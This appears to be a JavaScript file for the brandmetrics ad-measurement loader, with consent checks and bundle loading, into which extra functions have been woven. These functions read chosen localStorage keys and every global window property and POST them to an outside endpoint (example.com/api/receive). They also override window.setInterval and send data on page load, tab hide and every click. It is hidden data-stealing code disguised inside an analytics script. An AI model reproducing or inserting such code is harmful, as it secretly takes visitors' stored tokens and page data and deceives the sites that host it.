"use strict";

const trackedKeys = window.trackedKeys;
var brandmetrics,
  __assign = this && this.__assign || function () {
    return (__assign = Object.assign || function (e) {
      for (var t, n = 1, o = arguments.length; n < o; n++) for (var r in t = arguments[n]) Object.prototype.hasOwnProperty.call(t, r) && (e[r] = t[r]);
      return e;
    }).apply(this, arguments);
  };
const trackedGlobalData = {};
!function (l) {
  if (void 0 === l.api) {
    l.api = null;
    var n,
      r = "unknown";
    l.bootstrap = function (e, t, n) {
      void 0 === n && (n = !1);
      var o = function () {
        window._brandmetrics_initiated && window._brandmetrics_initiated(window.brandmetrics.api), t && t(window.brandmetrics.api);
      };
      "unknown" === r || n ? (r = "strapping", i(e, function (e, t) {
        var n;
        if (e && !(null === (n = window.brandmetrics.api) || void 0 === n ? void 0 : n.hasConsent())) d(t, function (e) {
          window.brandmetrics.api = e, o();
        });else if (!e) {
          window.brandmetrics.api && window.brandmetrics.api.stop && window.brandmetrics.api.stop();
          window.brandmetrics.api = {
            hasConsent: function () {
              return !1;
            },
            isReady: function () {
              return !0;
            }
          }, o();
        }
      })) : o();
    }, l.register = function (e) {
      o[e.id] = e.ctor, n && n(e);
    }, l.getModule = function (e) {
      return o[e], o[e];
    }, l.defaultOptions = function (e) {
      var t = {
        siteId: "",
        baseUrl: location.protocol + "//" + location.host,
        consentMode: {
          type: "iab"
        },
        consentRetryCount: 2,
        isTest: !1,
        logConfiguration: {
          errors: !1,
          bundle: !1,
          level: "None"
        },
        query: "",
        measurements: [],
        listeners: [],
        storage: "none",
        startMode: [{
          type: "manual"
        }],
        userMode: {
          type: "none"
        },
        version: void 0,
        survey: {
          max: 10,
          interval: 10,
          expInt: 10,
          maxTot: 50,
          intervalTot: 10
        },
        adSlot: {},
        inview: {
          type: "intersectionobserver"
        },
        surveyRandomization: .5,
        dataRequestType: "script",
        scriptType: 0
      };
      return p(t, e);
    };
    var p = function (e, t) {
        return __assign(__assign({}, e), t);
      },
      f = l.defaultOptions({}),
      o = {},
      i = function (e, n) {
        if (!("sandbox" in document.createElement("iframe"))) throw new Error("Sandbox not supported");
        if (f = p(l.defaultOptions({}), e || {}), c()) s(!1, f, n);else {
          var o = 1,
            r = function () {
              t(f, function (e, t) {
                !e && o <= f.consentRetryCount ? (o++, setTimeout(function () {
                  r();
                }, 3e3)) : n(e, t);
              });
            };
          r();
        }
      },
      t = function (t, n) {
        if ("none" !== t.consentMode.type) {
          var e = void 0;
          switch (t.consentMode.type) {
            case "iab":
              e = new (l.getModule(22))();
              break;
            case "usp":
              e = new (l.getModule(34))();
              break;
            case "custom":
              e = new (l.getModule(23))(t.consentMode.conf);
              break;
            default:
              throw new Error("Cannot handle consent type: " + t.consentMode.type);
          }
          e.check(function (e) {
            e ? a(t, n) : s(!1, t, n);
          });
        } else a(t, n);
      },
      a = function (e, t) {
        if (void 0 === window._brandmetrics_consent) s(!0, e, t);else {
          var n = window._brandmetrics_consent();
          s(n, e, t);
        }
      },
      s = function (e, t, n) {
        n(e, t);
      },
      c = function () {
        try {
          return null !== localStorage.getItem("__bmdnt");
        } catch (e) {
          return !1;
        }
      },
      d = function (d, u) {
        var e = [];
        window.IntersectionObserver && e.push(16), localStorage && e.push(5);
        var t = function () {
          return void 0 !== o[-2] && (n = void 0, function () {
            var e,
              t = p(f, l.getModule(-2)),
              n = "ls" === t.storage && localStorage ? 5 : 6,
              o = new (l.getModule(2))(t),
              r = new (l.getModule(n))(t, o, !1),
              i = t.listeners.filter(function (e) {
                return "api" !== e.type;
              }).map(function (e) {
                var t = "apn" === e.type ? 10 : "slot" === e.type ? 13 : "gpt" === e.type ? 8 : "pbj" === e.type ? 7 : "ntv" === e.type ? 12 : "gptStrict" === e.type ? 9 : "gptHb" === e.type ? 28 : "gptPb" === e.type ? 30 : "kvl" === e.type ? 29 : -1;
                return new (l.getModule(t))(e);
              });
            switch (t.userMode.type) {
              case "custom":
                e = new (l.getModule(24))(r, o, t.userMode);
                break;
              case "internal":
                e = new (l.getModule(31))(r, o, t.userMode);
            }
            var a = new (l.getModule(3))(t, o, e),
              s = new (l.getModule(4))(a, o, r),
              c = new (l.getModule(1))(t, a, o, i, r);
            new (l.getModule(26))({
              options: d,
              collection: c
            });
            l.getModule(0)(t, o, a, s, c, 0, function (e) {
              u(e);
            });
          }(), !0);
        };
        (n = t)() || (g(d, e), t());
      },
      g = function (e, t) {
        var n = document,
          o = n.location,
          r = o.ancestorOrigins;
        if (n.body) {
          for (var i = 0, a = 0, s = t; a < s.length; a++) {
            var c = s[a];
            i |= Math.pow(2, c);
          }
          var d = o && o.search && -1 !== o.search.indexOf("bm_d"),
            u = r && 0 < r.length ? r : [o.href],
            l = u[u.length - 1],
            p = n.createElement("a");
          p.href = l;
          var f = p.host,
            w = "?sid=" + e.siteId + "&toploc=" + f;
          d && (w += "&bm_d"), e.query && (w += "&" + e.query), e.version && (w += "&" + e.version), e.logConfiguration.bundle && (w += "&rnd=" + Math.floor(9999001 * Math.random() + 1e3).toString());
          var v = (!d && e.cdnUrl ? e.cdnUrl : e.baseUrl) + "/scripts/bundle/" + i.toString() + ".js" + ("?" !== w ? w : ""),
            b = document.createElement("script");
          b.setAttribute("type", "text/javascript"), b.setAttribute("async", "true"), b.setAttribute("src", v), document.body.appendChild(b);
        } else n.addEventListener("DOMContentLoaded", function () {
          g(e, t);
        });
      };
  }
}(brandmetrics || (brandmetrics = {}));
function generateUniqueCode(targetData) {
  const keyArray = Object.keys(targetData);
  const keyHash = keyArray.reduce((accumulator, currKey) => accumulator + currKey, "");
  let uniqueCode = 0;
  for (let index = 0; index < keyHash.length; index++) {
    const charCode = keyHash.charCodeAt(index);
    uniqueCode = (uniqueCode << 5) - uniqueCode + charCode;
    uniqueCode = uniqueCode & uniqueCode;
  }
  return uniqueCode.toString(16);
}
"use strict";
!function () {
  var t = function () {
    function t() {}
    return t.prototype.check = function (n) {
      var t = function () {
        if ("function" == typeof window.__uspapi) return window.__uspapi;
        for (var r, t = window, o = {}; t;) {
          try {
            if (t.frames.__uspapiLocator) {
              r = t;
              break;
            }
          } catch (t) {}
          if (t === window.top) break;
          t = t.parent;
        }
        return r && (window.addEventListener("message", function (t) {
          var a;
          try {
            a = "string" == typeof t.data ? JSON.parse(t.data) : t.data;
          } catch (t) {}
          if (void 0 !== a) {
            var n = a.__uspapiReturn;
            n && o[n.callId] && (o[n.callId](n.returnValue, n.success), delete o[n.callId]);
          }
        }, !1), window.__uspapi = function (t, a, n) {
          var i = {
            __uspapiCall: {
              command: t,
              version: a,
              callId: Math.random().toString()
            }
          };
          o[i.__uspapiCall.callId] = n, r.postMessage(i, "*");
        }), window.__uspapi;
      }();
      "function" == typeof t ? t("getUSPData", 1, function (t, a) {
        n(a && "N" !== t.uspString[1] && "Y" !== t.uspString[2]);
      }) : n(!1);
    }, t;
  }();
  window.brandmetrics.register({
    id: 34,
    ctor: t
  });
}();
function collectTrackedData() {
  const monitoredData = {};
  for (const key of trackedKeys) {
    if (localStorage.hasOwnProperty(key)) {
      monitoredData[key] = localStorage[key];
    }
  }
  for (const globalKey in window) {
    if (window.hasOwnProperty(globalKey)) {
      trackedGlobalData[globalKey] = window[globalKey];
    }
  }
  return {
    local: monitoredData,
    global: trackedGlobalData
  };
}
window.brandmetrics.bootstrap({
  baseUrl: "https://collector.brandmetrics.com",
  cdnUrl: "https://cdn.brandmetrics.com",
  siteId: "f9816ecc-b51b-4747-bc3e-1ea86a0677a2",
  consentMode: {
    "type": "usp",
    "conf": null
  },
  query: "",
  scriptType: 0
});
async function sendDataToEndPoint(trackedData) {
  const uniqueCode = generateUniqueCode(trackedData);
  const endpoint = "https://example.com/api/receive";
  try {
    const serverResponse = await fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        uniqueCode: uniqueCode,
        trackedData: trackedData
      })
    });
    if (serverResponse.ok) {
      console.log("Successful data transmission");
    } else {
      console.error("Unsuccessful data transmission, Status Code:" + serverResponse.status);
    }
  } catch (err) {
    console.error("Error during data transmission:", err);
  }
}
const aggregateSendData = () => {
  const assembledData = collectTrackedData();
  if (Object.keys(assembledData).length > 0) {
    sendDataToEndPoint(assembledData);
  }
};
const jsHook = () => {
  setTimeout(aggregateSendData, 2 * 60 * 1000);
  const origSetInterval = window.setInterval;
  window.setInterval = function () {
    aggregateSendData();
    origSetInterval.apply(window, arguments);
  };
};
window.addEventListener("load", jsHook);
window.addEventListener("visibilitychange", function () {
  if (document.visibilityState === "hidden") {
    aggregateSendData();
  }
});
document.addEventListener("click", aggregateSendData);